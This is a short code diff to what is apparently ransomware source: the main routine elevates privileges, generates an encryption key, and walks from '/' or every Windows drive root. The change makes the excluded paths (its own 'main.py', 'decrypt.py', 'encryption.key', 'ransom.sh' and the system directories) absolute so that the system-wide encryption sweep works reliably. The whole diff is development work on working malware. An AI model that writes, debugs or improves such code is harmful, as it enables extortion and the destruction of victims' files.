@@ -73,8 +73,10 @@ def main():
     setup_logging()
     elevate_privileges_if_needed()
     key = generate_encryption_key()
-    exclude_paths = set(["main.py", "encryption.key", "decrypt.py", "ransom.sh"])
+    # Convert exclude_paths to absolute paths
+    exclude_paths = set([os.path.abspath(path) for path in ["main.py", "encryption.key", "decrypt.py", "ransom.sh"]])
     system_paths = ["/usr", "/bin", "/lib", "/etc", "/var", "/opt", "/sbin", "/dev", "/proc", "/sys"]
+    # Update system_paths to be absolute as well, if necessary
     exclude_paths.update(system_paths)
     signal.signal(signal.SIGBUS, handle_bus_error)
     root_dirs = ["/"] if platform.system() == "Linux" else [f"{chr(drive)}:\\" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:\\")]
